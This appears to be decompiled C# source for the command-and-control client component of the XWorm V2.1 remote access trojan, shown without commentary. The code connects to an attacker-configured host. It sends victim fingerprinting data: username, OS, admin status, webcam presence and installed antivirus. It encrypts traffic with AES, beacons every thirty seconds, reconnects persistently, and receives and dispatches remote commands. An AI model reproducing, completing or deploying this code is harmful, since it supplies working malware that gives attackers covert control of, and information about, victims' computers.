using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Stub
{
	// Token: 0x02000009 RID: 9
	public class ClientSocket
	{
		// Token: 0x06000017 RID: 23 RVA: 0x00002308 File Offset: 0x00000508
		public static void BeginConnect()
		{
			Thread.Sleep(4000);
			if (!ClientSocket.isConnected)
			{
				try
				{
					try
					{
						Thread thread = new Thread(delegate()
						{
							ClientSocket.S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							ClientSocket.BufferLength = -1L;
							ClientSocket.Buffer = new byte[1];
							ClientSocket.MS = new MemoryStream();
							ClientSocket.S.ReceiveBufferSize = 512000;
							ClientSocket.S.SendBufferSize = 512000;
							try
							{
								ClientSocket.S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port));
								ClientSocket.isConnected = true;
								ClientSocket.Send(Conversions.ToString(ClientSocket.Info()));
								ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
								GC.Collect();
							}
							catch (Exception ex)
							{
								GC.Collect();
								ClientSocket.isDisconnected();
							}
						});
						thread.Start();
						GC.Collect();
					}
					catch (Exception ex)
					{
					}
				}
				catch (Exception ex2)
				{
					ClientSocket.isDisconnected();
				}
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002384 File Offset: 0x00000584
		public static object Info()
		{
			ComputerInfo computerInfo = new ComputerInfo();
			return string.Concat(new object[]
			{
				"INFO",
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				Helper.ID(),
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				Environment.UserName,
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				computerInfo.OSFullName.Replace("Microsoft", null),
				Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ",
				Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"),
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				"XWorm V2.1",
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				Helper.INDATE(),
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				Helper.usbp(),
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				Helper.admin(),
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				Messages.Cam(),
				RuntimeHelpers.GetObjectValue(ClientSocket.SPL),
				Helper.Antivirus()
			});
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000024E0 File Offset: 0x000006E0
		public static void BeginReceive(IAsyncResult ar)
		{
			if (!ClientSocket.isConnected)
			{
				ClientSocket.isDisconnected();
			}
			checked
			{
				try
				{
					int num = ClientSocket.S.EndReceive(ar);
					if (num > 0)
					{
						if (ClientSocket.BufferLength == -1L)
						{
							if (ClientSocket.Buffer[0] == 0)
							{
								ClientSocket.BufferLength = Conversions.ToLong(Helper.BS(ClientSocket.MS.ToArray()));
								ClientSocket.MS.Dispose();
								ClientSocket.MS = new MemoryStream();
								if (ClientSocket.BufferLength == 0L)
								{
									ClientSocket.BufferLength = -1L;
									ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
									return;
								}
								ClientSocket.Buffer = new byte[(int)(ClientSocket.BufferLength - 1L) + 1];
							}
							else
							{
								ClientSocket.MS.WriteByte(ClientSocket.Buffer[0]);
							}
						}
						else
						{
							ClientSocket.MS.Write(ClientSocket.Buffer, 0, num);
							if (ClientSocket.MS.Length == ClientSocket.BufferLength)
							{
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									ClientSocket.BeginRead((byte[])a0);
								}, ClientSocket.MS.ToArray());
								ClientSocket.BufferLength = -1L;
								ClientSocket.MS.Dispose();
								ClientSocket.MS = new MemoryStream();
								ClientSocket.Buffer = new byte[1];
							}
							else
							{
								ClientSocket.Buffer = new byte[(int)(ClientSocket.BufferLength - ClientSocket.MS.Length - 1L) + 1];
							}
						}
						ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
					}
					else
					{
						ClientSocket.isDisconnected();
					}
				}
				catch (Exception ex)
				{
					ClientSocket.isDisconnected();
				}
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000026B0 File Offset: 0x000008B0
		public static void BeginRead(byte[] b)
		{
			try
			{
				Messages.Read(b);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000026E4 File Offset: 0x000008E4
		public static void Send(string msg)
		{
			try
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
					byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
					memoryStream.Write(array2, 0, array2.Length);
					memoryStream.Write(array, 0, array.Length);
					ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
					ClientSocket.S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					GC.Collect();
				}
			}
			catch (Exception ex)
			{
				ClientSocket.isDisconnected();
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x0000279C File Offset: 0x0000099C
		private static void EndSend(IAsyncResult ar)
		{
			try
			{
				ClientSocket.S.EndSend(ar);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000027D8 File Offset: 0x000009D8
		public static void isDisconnected()
		{
			ClientSocket.isConnected = false;
			try
			{
				ClientSocket.S.Close();
				ClientSocket.S.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				ClientSocket.MS.Close();
				ClientSocket.MS.Dispose();
			}
			catch (Exception ex2)
			{
			}
			ClientSocket.BeginConnect();
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002854 File Offset: 0x00000A54
		public static void Ping()
		{
			for (;;)
			{
				Thread.Sleep(30000);
				try
				{
					if (ClientSocket.S.Connected)
					{
						using (MemoryStream memoryStream = new MemoryStream())
						{
							byte[] array = Helper.AES_Encryptor(Helper.SB("PING?"));
							byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
							memoryStream.Write(array2, 0, array2.Length);
							memoryStream.Write(array, 0, array.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
							GC.Collect();
							GC.WaitForPendingFinalizers();
						}
					}
				}
				catch (Exception ex)
				{
					ClientSocket.isConnected = false;
					GC.Collect();
				}
			}
		}

		// Token: 0x04000015 RID: 21
		public static bool isConnected = false;

		// Token: 0x04000016 RID: 22
		public static Socket S;

		// Token: 0x04000017 RID: 23
		public static long BufferLength = 0L;

		// Token: 0x04000018 RID: 24
		public static byte[] Buffer;

		// Token: 0x04000019 RID: 25
		public static MemoryStream MS = new MemoryStream();

		// Token: 0x0400001A RID: 26
		public static readonly object SPL = Settings.SPL;
	}
}
